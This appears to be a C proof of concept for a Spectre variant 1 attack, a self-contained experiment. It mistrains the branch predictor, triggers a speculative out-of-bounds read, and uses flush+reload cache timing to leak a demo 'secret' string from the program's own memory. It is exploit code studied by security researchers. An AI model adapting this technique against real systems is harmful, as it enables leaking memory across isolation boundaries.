#include <stdio.h>
#include <stdlib.h>

#include "gen_array.c"
#include "time_and_flush.c"

#define REPETITIONS 1

//last two pages will not be accessible.
int accessible_pages = N_PAGES-2;

unsigned char* accessible_data;
unsigned char* secret_data;
int accessible_size;
int secret_size;

__attribute__((noinline)) void victim_func(int i, cp_t* arr) {

    //flush bound value
    flush((void*)&accessible_size);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (i < accessible_size) {
        unsigned char x = accessible_data[i];
        volatile cp_t cp = arr[x];
        printf("found %c\n", x);
    }
}

int* spv1(int index) {

    cp_t* arr = mmap_arr_cache_pages();
    flush_arr(arr);
    __sync_synchronize();

    //Misstrain branch predictor
    for(int i = 0; i < accessible_size; i++) {
        victim_func(i, arr);
        //flush((void*)&arr[accessible_data[i]]);
        __sync_synchronize();
    }

    //flush remnant data
    //flush_arr((void*)arr);
    __sync_synchronize();

    //access out of bounds
    victim_func(index, arr);

    //time loading duration per array index
    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

void print_results(int** results) {

    for(int r = 0; r < REPETITIONS; r++) {
        printf("possible %dth character:\t", r);
        for(int p = 0; p < N_PAGES; p++) {
            if(results[r][p] < MAYBE_CACHE_HIT)
            printf(("'%c':%d, "), p, results[r][p]);
        }
        printf("\n");
    }
    for(int r = 0; r < REPETITIONS; r++) {
        for (int i = 97; i < 123; i++) {
            printf("%c:%u\t", i, results[r][i]);
            if (i % 5 == 1 || i == 122)printf("\n");
        }
    }
    /*for(int i = 0; i < N_PAGES; i ++) {
        printf("page %i: \t[", i);
        for(int j = 0; j < REPETITIONS; j++) {
            printf(("%4d, "), results[j][i]);
        }
        printf("]\n");
    }*/

    /*printf("\t   page:");
    for(int p = 0; p < N_PAGES; p++) printf("%4d\t", p);
    printf("\n");
    for(int r = 0; r < REPETITIONS; r++) {
        printf("rep: %3d\t", r);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[r][p];
            if (t < CACHE_HIT)  printf("[%3d]\t", t);
            else                printf("%4d\t", t);
        }
        printf("\n");
    }*/
}

int main(int argc, char* argv[]) {

    //array [0,1,2,3,4...]. one-but-last points to last.
    accessible_data = "notsecretzhis is a secret message";
    accessible_size = 10;
    secret_data = accessible_data + accessible_size;
    secret_size = 25;

    int* results[REPETITIONS];
    for(int i = 0; i < REPETITIONS; i++) results[i] = malloc(N_PAGES * sizeof(int));

    //for(int i = 0; i < 1; i++) {
    int leak = accessible_size;
    printf("tryna leak index %d char %c\n", leak, accessible_data[leak]);
    results[0] = spv1(leak);
    //}

    print_results(results);

    for(int i = 0; i < REPETITIONS; i++) free(results[i]);
}